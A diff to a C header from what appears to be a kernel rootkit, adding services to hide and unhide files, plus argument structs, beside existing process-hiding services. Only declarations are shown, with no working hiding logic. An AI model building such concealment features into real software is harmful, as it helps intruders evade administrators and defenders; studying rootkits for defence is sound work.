@@ -19,7 +19,10 @@
 enum YARRCALL_SERVICE {
     HIDE_PID = 1,
     UNHIDE_PID,
-    __GET_PROC_INFO
+    HIDE_FILE,
+    UNHIDE_FILE,
+    __GET_PROC_INFO,
+    __SHOW_STACKS
 };
 
 // TODO: I'm going to define all the argument types for services here. They
@@ -27,26 +30,24 @@ enum YARRCALL_SERVICE {
 // of their subsystem, but I want userland programs to be able to include this
 // file and know about these arguments, so to keep things simple I just define
 // everything down below.
-typedef struct {
+typedef struct hidepid_args {
     pid_t pid;
 } HidePidArgs_t;
 
-typedef struct {
+typedef struct hidefile_args {
+    char fname[0];
+} HideFileArgs_t;
+
+typedef struct getprocinfo_args {
     pid_t pid;
     pid_t tgid;
 } __GetProcInfoArgs_t;
-
-// TODO: Example.
-//typedef struct {
-//    char *name;
-//} HideFileArgs_t;
 
 // Each service has its own arguments, we use this union to encapsulate them
 // and have easier access for each service.
 typedef union {
     HidePidArgs_t hidepid_args;
-    // TODO: Example.
-    //HideFileArgs_t hidefile_args;
+    HideFileArgs_t hidefile_args;
     __GetProcInfoArgs_t getprocinfo_args;
 } YarrcallArgs_t;
 
